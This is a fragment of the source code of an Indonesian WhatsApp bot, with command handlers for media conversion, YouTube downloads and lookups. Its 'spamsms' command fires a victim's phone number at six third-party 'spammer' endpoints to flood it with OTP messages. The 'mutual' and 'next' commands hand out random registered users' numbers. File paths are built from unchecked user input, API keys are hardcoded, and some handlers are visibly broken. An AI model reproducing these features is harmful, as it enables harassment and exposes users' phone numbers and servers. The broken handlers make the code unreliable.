					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					reply(dla.wait())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal Kak Coba Ulangi:)')
						mhee = fs.readFileSync(ran)
						dila.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 999999999, quoted: Lan })
						fs.unlinkSync(ran)
					})
					break
				case 'toimg':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isQuotedSticker) return reply('Reply Sticker Nya Kak')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(dla.stikga())
						buffer = fs.readFileSync(ran)
						dila.sendMessage(from, buffer, image, { quoted: Lan })
						fs.unlinkSync(ran)
					})
					break
   case 'imgtourl':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					costum('[WAIT] Sabar Kak', text, tescuk, cr)
					var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
					var media = await dila.downloadAndSaveMediaMessage(encmedia)
					var imgbb = require('imgbb-uploader')
					imgbb('9ba3ffa6160a701a61ebafebca46f4cf', media)
						.then(data => {
							var caps = `「 *IMAGE TO URL* 」

❏ ID : ${data.id}
❏ MimeType : ${data.image.mime}
❏ Extension : ${data.image.extension}
❏ URL : ${data.display_url}`
							ibb = fs.readFileSync(media)
							dila.sendMessage(from, ibb, image, { quoted: Lan, caption: caps })
						})
						.catch(err => {
							throw err
						})
					break

				case 'komenyt':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					gh = body.slice(9)
					usnm = gh.split("&")[0];
					cmn = gh.split("&")[1];
					var imgbb = require('imgbb-uploader')
					try {
						pp = await dila.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
						pp = 'https://i.ibb.co/Tv6JR98/baby.jpg'
					}
					media = await getBuffer(pp)
					datae = await imageToBase64(JSON.stringify(pp).replace(/\"/gi, ''))
					fs.writeFileSync('getpp.jpeg', datae, 'base64')
					res = await imgbb("7f2cf4cd570b9a442d6fdec16b74dcfc", 'getpp.jpeg')
					buffer = await getBuffer(`https://some-random-api.ml/canvas/youtube-comment?avatar=${res.display_url}&comment=${cmn}&username=${usnm}`)
					dila.sendMessage(from, buffer, image, { caption: 'Nih Cok', contextInfo: { participant: '0@s.whatsapp.net', quotedMessage: { conversation: '*_YOUTUBE COMMENT_*' } } })
					break

				case 'trigered':
				case 'trigger':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						reply(dla.wait())
						owgi = await dila.downloadAndSaveMediaMessage(ger)
						anu = await imgbb("7f2cf4cd570b9a442d6fdec16b74dcfc", owgi)
						trig = `${anu.display_url}`
						ranp = getRandom('.gif')
						rano = getRandom('.webp')
						anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${trig}`
						exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
							fs.unlinkSync(ranp)
							if (err) return reply('GAGAL UM')
							nobg = fs.readFileSync(rano)
							dila.sendMessage(from, nobg, sticker, { quoted: Lan })
							fs.unlinkSync(rano)
						})
					} else {
						reply('Gunakan Foto Kakm')
					}
					break
			    case 'nightcore':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)			    
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'slow':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'tupai':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'blub':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'gemuk':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'ghost':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						ghs = fs.readFileSync(ran)
					dila.sendMessage(from, ghs, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
		       case 'bass':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)		   
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=64:width_type=o:width=2:g=56 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					   })
				       break
	             case 'toptt':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
					dila.sendMessage(from, topt, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
						})
						await limitAdd(sender)
					    break
				case 'mutualmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const mtal = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}mutual\`\`\`
\`\`\`│◪ ${prefix}next\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, mtal, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Mutual Menu', orderTitle: 'Mutual Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
				case 'mutual':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (isGroup) return reply('Maaf Kak Tidak Bisa Di Group')
					anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net', '')
					await reply('Mencari Pasangan >_<')
					await reply(`wa.me/${anug}`)
					await reply(`Pasangan Ditemukan :\n*${prefix}next* — Temukan Pasangan Baru`)
					break

				case 'next':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (isGroup) return reply('Maaf Kak Tidak Bisa Di Group')
					anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net', '')
					await reply('Mencari Pasangan >_<')
					await reply(`wa.me/${anug}`)
					await reply(`Pasangan Ditemukan :\n*${prefix}next* — Temukan Pasangan Baru`)
					break
					
				case 'othermenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const other = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}lacakip\`\`\`
\`\`\`│◪ ${prefix}dorking\`\`\`
\`\`\`│◪ ${prefix}brainly\`\`\`
\`\`\`│◪ ${prefix}wiki\`\`\`
\`\`\`│◪ ${prefix}kbbi\`\`\`
\`\`\`│◪ ${prefix}covid\`\`\`
\`\`\`│◪ ${prefix}pinterest\`\`\`
\`\`\`│◪ ${prefix}jadwalsholat\`\`\`
\`\`\`│◪ ${prefix}spamsms\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, other, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Other Menu', orderTitle: 'Other Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
					case 'dorking':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
			    dork = `${body.slice(9)}`
					anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/dorking?dork=${dork}`, {method: 'get'})
					var ko = '1'
					for (let i = 0; i < anu.result.length; i++) { 
					 teks = `${ko}\n${anu.result[i]}`
					 ko++
					}
					reply(teks)
					break
					case 'spamsms':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
					await fetchJson(`https://api.xteam.xyz/spammer/pizzahut?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/olx?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/jagreward?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/danacita?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/akademi?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/icq?no=${q}&APIKEY=${xteam}`)
					reply('Done')
                    break
                    case 'ytsch':
           case 'ytsearch':
           if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
            if (!args.length) return reply('Judulnya apa kak?')
            try {
                const input = args.join(" ")
                const filter1 = await ytsr.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsr(filters1.url, { limit: 10 })

                let hehe = `┌ ◪ *YOUTUBE SEARCH*
└ *Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ ❏ *Judul:* ${items[i].title}
├ ❏ *Id:* ${items[i].id}
├ ❏ *Ditonton:* ${items[i].views}
├ ❏ *Durasi:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await dila.sendMessage(from, thumb, image, {quoted: Lan, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link youtube] = Audio
└ ${prefix}ytmp4 [link youtube] = Video`})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
			case 'play':{
				if (isBanned) return reply(dla.baned())
			if (!isRegistered) return reply(dla.noregis())
			if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
			await limitAdd(sender)
                var title = body.slice(6)
                reply(dla.wait())
                var link1 = await ytplay(title)
                ytdldown(link1, 'mp3').then(async(res) => {
                	//console.log(res.link)
                    if (res.status === 'error') return reply(`${res.title}\n\nError silahkan klik link dibawah ini\n${res.link}`)
                    if (res.status === 'sukses') {
                    	thumb = await getBuffer(res.thumbnail)
                        dila.sendMessage(from, res.thumbnail, image, {quoted: Lan, caption: `❏ *Judul* : ${res.title}\n\nBentar kak Audionya lagi dikirim`})
                        vid = await getBuffer(res.link)
                        dila.sendMessage(from, vid, audio, {mimetype: 'audio/mp4', duration: 999999999, filename: `${res.title}.mp3`, quoted: Lan})
                        }
                }).catch((e) => {
                    console.error(e)
                    reply(`Error: ${e.message}`)
                })
            }
            break
			case 'ytmp3':
			if (isBanned) return reply(dla.baned())
			if (!isRegistered) return reply(dla.noregis())
			if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
			await limitAdd(sender)
			if (args.length < 1) return reply('Urlnya mana kak?')
			const urlmsc = args[0];
		    try {
        	var aramam = await yts({videoId: ytdl.getURLVideoID(urlmsc)});
    		} catch {
        	return await dila.sendMessage(from, 'Error!', MessageType.text)
    		}
            reply(dla.wait())
    		let titles = 'lu sayang gk sama w? :)'
    		let streams = ytdl(aramam.videoId, {
        	quality: 'highestaudio',
   			});
    		var mbuff = await getBuffer(aramam.image)
    		got.stream(aramam.image).pipe(fs.createWriteStream(titles + '.jpg'));
    		ffmpeg(streams)
        	.audioBitrate(320)
        	.save('./' + titles + '.mp3')
        	.on('end', async () => {
            const writers = new ID3Writer(fs.readFileSync('./' + titles + '.mp3'));
            writers.setFrame('TIT2', aramam.title)
            .setFrame('TPE1', [aramam.author.name])
            .setFrame('APIC', {
            type: 3,
            data: fs.readFileSync(titles + '.jpg'),
            description: aramam.description
            });
            writers.addTag();
            playmsc = `「 *_YOUTUBE MP3_* 」\n\n❏ *Title* : ${aramam.title}\n❏ *By* : ${aramam.author.name}\n\nBentar kak Audionya lagi dikirim`
            await dila.sendMessage(from, mbuff, image, {quoted: Lan, caption: playmsc})
            await dila.sendMessage(from, Buffer.from(writers.arrayBuffer), audio, {mimetype: Mimetype.mp4Audio, duration: 999999999, ptt: false, quoted: Lan});
        	fs.unlinkSync(titles + '.jpg')
        	fs.unlinkSync('./' + titles + '.mp3')
        	});
			break
            case 'ytmp4':
	 		if (args.length < 1) return reply('Urlnya mana kak?')
			const urlvid = args[0]
		    try {
        	var aramav = await yts({videoId: ytdl.getURLVideoID(urlvtext)});
    		} catch {
        	return await dila.sendMessage(from, 'Error!', MessageType.text)
    		}
    		reply(dla.wait())
    		var yt = ytdl(aramav.videoId, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
  			yt.pipe(fs.createWriteStream('./' + aramav.videoId + '.mp4'));
  			yt.on('end', async () => {
  			playvid = `「 *_YOUTUBE MP4_* 」\n\n❏ *Title* : ${aramav.title}\n❏ *By* : ${aramav.author.name}\n\nBentar kak Videonya lagi dikirim`	
        	await dila.sendMessage(from, fs.readFileSync('./' + aramav.videoId + '.mp4'), video, {mimetype: Mimetype.mp4, duration: 999999999, quoted: Lan, caption: playvid});
        	fs.unlinkSync('./' + aramav.videoId + '.mp4')
        	});
			break
              case 'lacakip':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length === 0) return reply(`Contoh :\n${prefix}lacakip 10.43.180.140`)
					iplu = `${body.slice(9)}`
					data = await fetchJson(`https://videfikri.com/api/iplookup/?ip=${iplu}`, { method: 'get' })
					lacaks = data.result
					lacak = `❏ Ip : ${lacaks.ip}
❏ Country : ${lacaks.country}
❏ Country code : ${lacaks.country_code}
❏ Region : ${lacaks.region}
❏ Region name : ${lacaks.region_name}
❏ City : ${lacaks.city}
❏ Latitude : ${lacaks.latitude}
❏ Longtitude : ${lacaks.longtitude}
❏ Timezone : ${lacaks.timezone}
❏ Isp : ${lacaks.isp}
❏ Org : ${lacaks.org}
❏ As : ${lacaks.as}`
					dila.sendMessage(from, lacak, text, { quoted: Lan })
					break

				case 'brainly':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					if (args.length < 1) return reply(`Yang Mau Dicari Apa Kak?\nContoh :\n${prefix}brainly apa itu bot`)
					await limitAdd(sender)
					brien = body.slice(9)
					brainly(`${brien}`).then(res => {
						teks = '─────「 _*BRAINLY*_ 」─────\n'
						for (let Y of res.data) {
							teks += `\n❏ *Pertanyaan:* ${Y.pertanyaan}\n❏ *Jawaban:* ${Y.jawaban[0].text}\n\n─────「 _*BRAINLY*_ 」─────`
						}
						dila.sendMessage(from, teks, text, { quoted: Lan, detectLinks: false })
						console.log(res)
					})
					break

				case 'wiki':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Yang Mau Dicari Apa Kak?\nContoh :\n${prefix}wiki online`)
					var bby = body.slice(6)
					anu = await fetchJson(`https://api.zeks.xyz/api/wiki?q=${bby}&apikey=apivinz`)
					reply('[WAIT] Sedang Searching...')
					wikiped = `「 WIKI PEDIA 」\n Jawaban : ${anu.result.result}`
					dila.sendMessage(from, wikiped, text, { quoted: Lan })
					break

				case 'kbbi':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Yang Mau Dicari Apa Kak?\nContoh :\n${prefix}kbbi manusia`)
					var bby = body.slice(6)
					anu = await fetchJson(`https://videfikri.com/api/kbbi/?query=${bby}`)
					reply('[WAIT] Sedang Searching...')
					kabebei = `「 *KBBI* 」\nJawaban : ${anu.result.hasil}`
					dila.sendMessage(from, kabebei, text, { quoted: Lan })
					break
					
				case 'covid':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`https://videfikri.com/api/covidindo/`)
					cvd = `「 *INGFO COVID* 」

Negara : ${anu.result.country}
Positif : ${anu.result.positif}
Sembuh : ${anu.result.sembuh}
Meninggal : ${anu.result.meninggal}`
					dila.sendMessage(from, cvd, text, { quoted: Lan })
					break
					
				case 'pinterest':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					dila.updatePresence(from, Presence.composing)
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${body.slice(11)}`, { method: 'get' })
					reply(dla.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek = n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					dila.sendMessage(from, pok, image, { quoted: Lan, caption: `*PINTEREST*` })
					break
					case 'jadwalsholat':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Daerah Nya Mana?\nContoh :\n${prefix}jadwalsholat Tasikmalaya`)
					anu = await fetchJson(`https://api.zeks.xyz/api/jadwalsholat?apikey=apivinz&daerah=${q}`)
					jsholat `${anu.data.string}`
					dila.sendMessage(from, jsholat, text, {quoted: Lan})
					break

				case 'storagemenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const storage = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}addstiker\`\`\`
\`\`\`│◪ ${prefix}getstiker\`\`\`
\`\`\`│◪ ${prefix}liststiker\`\`\`
\`\`\`│◪ ${prefix}addvideo\`\`\`
\`\`\`│◪ ${prefix}getvideo\`\`\`
\`\`\`│◪ ${prefix}listvideo\`\`\`
\`\`\`│◪ ${prefix}addvn\`\`\`
\`\`\`│◪ ${prefix}getvn\`\`\`
\`\`\`│◪ ${prefix}listvn\`\`\`
\`\`\`│◪ ${prefix}addimage\`\`\`
\`\`\`│◪ ${prefix}getimage\`\`\`
\`\`\`│◪ ${prefix}listimage\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, storage, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Storage Menu', orderTitle: 'Storage Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
				case 'addstiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedSticker) return reply('Reply stickernya kak -_-')
					stiklan = body.slice(11)
					if (!stiklan) return reply('Namain Stickernya kak!')
					adds = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					lan = await dila.downloadMediaMessage(adds)
					setimker.push(`${stiklan}`)
					fs.writeFileSync(`./media/sticker/${stiklan}.webp`, lan)
					fs.writeFileSync(`./media/stik.json`, JSON.stringify(setimker))
					await reply('Sticker Berhasil Ditambahkan Ke Database Bot')
					break

				case 'getstiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Stiker Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}liststiker`)
					stikeram = body.slice(11)
					hasilya = fs.readFileSync(`./media/sticker/${stikeram}.webp`)
					dila.sendMessage(from, hasilya, sticker, { quoted: Lan })
					break

				case 'liststiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					lis = '╭──「 *LIST STICKER* 」\n'
					for (let cieee of setimker) {
						lis += `◯ ${cieee}\n`
					}
					lis += `\n╰─────「 *${setimker.length}* 」`
					dila.sendMessage(from, lis.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": setimker } })
					break

				case 'addvideo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedVideo) return reply('Reply Videonya Kak')
					adv = body.slice(10)
					if (!adv) return reply('Namain video nya kak')
					deo = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					dvi = await dila.downloadMediaMessage(deo)
					vidioya.push(`${adv}`)
					fs.writeFileSync(`./media/video/${adv}.mp4`, dvi)
					fs.writeFileSync(`./media/video.json`, JSON.stringify(vidioya))
					dila.sendMessage(from, `Video Berhasil Ditambahkan Ke Database Bot`, MessageType.text, { quoted: Lan })
					break

				case 'getvideo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Video Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}listvideo`)
					getvi = body.slice(10)
					buffer = fs.readFileSync(`./media/video/${getvi}.mp4`)
					dila.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: Lan })
					break

				case 'listvideo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					list = '╭──「 *LIST VIDEO* 」\n'
					for (let nihh of vidioya) {
						list += `◯ ${nihh}\n`
					}
					list += `\n╰─────「 *${vidioya.length}* 」`
					dila.sendMessage(from, list.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": vidioya } })
					break

				case 'addvn':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedAudio) return reply('Reply Vn Nya Kak')
					advn = body.slice(7)
					if (!advn) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await dila.downloadMediaMessage(boij)
					audioya.push(`${advn}`)
					fs.writeFileSync(`./media/audio/${advn}.mp3`, delb)
					fs.writeFileSync('./media/audio.json', JSON.stringify(audioya))
					dila.sendMessage(from, `Vn Berhasil Ditambahkan Ke Database Bot`, MessageType.text, { quoted: Lan })
					break

				case 'getvn':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Vn Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}listvn`)
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./media/audio/${namastc}.mp3`)
					dila.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: Lan })
					break

				case 'listvn':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					lisv = '╭──「 *LIST VN* 」\n'
					for (let awokwkwk of audioya) {
